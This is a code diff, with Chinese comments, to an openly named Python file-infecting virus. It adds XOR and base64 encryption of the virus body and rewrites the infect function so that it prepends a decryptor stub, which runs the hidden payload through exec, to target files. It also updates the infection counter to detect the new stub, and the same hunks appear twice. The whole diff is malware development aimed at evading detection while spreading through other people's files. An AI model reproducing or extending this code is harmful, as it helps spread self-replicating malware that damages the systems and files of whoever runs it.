@@ -3,6 +3,8 @@ import os
 import logging
 import platform
 from datetime import datetime
+import base64
+import random
 
 # 配置日志
 logging.basicConfig(
@@ -11,6 +13,33 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s',
     force=True
 )
+
+def encrypt_code(code: str, key: int = None) -> tuple[str, int]:
+    """
+    使用异或加密和base64编码对代码进行加密
+    """
+    if key is None:
+        key = random.randint(1, 255)
+    
+    # 对代码进行异或加密
+    encrypted = ''.join(chr(ord(c) ^ key) for c in code)
+    # 使用base64编码
+    encoded = base64.b64encode(encrypted.encode()).decode()
+    return encoded, key
+
+def decrypt_code(encoded: str, key: int) -> str:
+    """
+    解密代码
+    """
+    try:
+        # base64解码
+        decoded = base64.b64decode(encoded).decode()
+        # 异或解密
+        decrypted = ''.join(chr(ord(c) ^ key) for c in decoded)
+        return decrypted
+    except Exception as e:
+        logging.error(f"解密失败: {str(e)}")
+        return None
 
 def check_environment():
     """检查运行环境的安全性"""
@@ -43,6 +72,8 @@ import os
 import logging
 import platform
 from datetime import datetime
+import base64
+import random
 
 # 配置日志
 logging.basicConfig(
@@ -51,6 +82,33 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s',
     force=True
 )
+
+def encrypt_code(code: str, key: int = None) -> tuple[str, int]:
+    """
+    使用异或加密和base64编码对代码进行加密
+    """
+    if key is None:
+        key = random.randint(1, 255)
+    
+    # 对代码进行异或加密
+    encrypted = ''.join(chr(ord(c) ^ key) for c in code)
+    # 使用base64编码
+    encoded = base64.b64encode(encrypted.encode()).decode()
+    return encoded, key
+
+def decrypt_code(encoded: str, key: int) -> str:
+    """
+    解密代码
+    """
+    try:
+        # base64解码
+        decoded = base64.b64decode(encoded).decode()
+        # 异或解密
+        decrypted = ''.join(chr(ord(c) ^ key) for c in decoded)
+        return decrypted
+    except Exception as e:
+        logging.error(f"解密失败: {str(e)}")
+        return None
 
 def check_environment():
     """检查运行环境的安全性"""
@@ -101,8 +159,30 @@ def infect(target_file):
         
         if '# --- VIRUS CODE START ---' not in original_code:
             logging.info(f"开始感染文件: {target_file}")
+            
+            # 获取病毒代码
+            virus_code = get_virus()
+            if virus_code is None:
+                return False
+                
+            # 加密病毒代码
+            encrypted_code, key = encrypt_code(virus_code)
+            
+            # 生成解密器代码
+            decryptor = f"""
+import base64
+def decrypt(c,k):
+ try:
+  d=base64.b64decode(c).decode()
+  return ''.join(chr(ord(x)^k)for x in d)
+ except:return''
+exec(decrypt('{encrypted_code}',{key}))
+"""
+            
+            # 写入文件
             with open(target_file, 'w') as f:
-                f.write(get_virus() + original_code)
+                f.write(decryptor + original_code)
+                
             logging.info(f"成功感染文件: {target_file}")
             return True
         return False
@@ -140,7 +220,7 @@ def get_infection_stats():
                 try:
                     with open(file, 'r') as f:
                         content = f.read()
-                    if '# --- VIRUS CODE START ---' in content:
+                    if 'exec(decrypt(' in content or '# --- VIRUS CODE START ---' in content:
                         infected_count += 1
                 except Exception as e:
                     logging.error(f"统计时读取文件 {file} 失败: {str(e)}")
@@ -185,8 +265,30 @@ def infect(target_file):
         
         if '# --- VIRUS CODE START ---' not in original_code:
             logging.info(f"开始感染文件: {target_file}")
+            
+            # 获取病毒代码
+            virus_code = get_virus()
+            if virus_code is None:
+                return False
+                
+            # 加密病毒代码
+            encrypted_code, key = encrypt_code(virus_code)
+            
+            # 生成解密器代码
+            decryptor = f"""
+import base64
+def decrypt(c,k):
+ try:
+  d=base64.b64decode(c).decode()
+  return ''.join(chr(ord(x)^k)for x in d)
+ except:return''
+exec(decrypt('{encrypted_code}',{key}))
+"""
+            
+            # 写入文件
             with open(target_file, 'w') as f:
-                f.write(get_virus() + original_code)
+                f.write(decryptor + original_code)
+                
             logging.info(f"成功感染文件: {target_file}")
             return True
         return False
@@ -224,7 +326,7 @@ def get_infection_stats():
                 try:
                     with open(file, 'r') as f:
                         content = f.read()
-                    if '# --- VIRUS CODE START ---' in content:
+                    if 'exec(decrypt(' in content or '# --- VIRUS CODE START ---' in content:
                         infected_count += 1
                 except Exception as e:
                     logging.error(f"统计时读取文件 {file} 失败: {str(e)}")
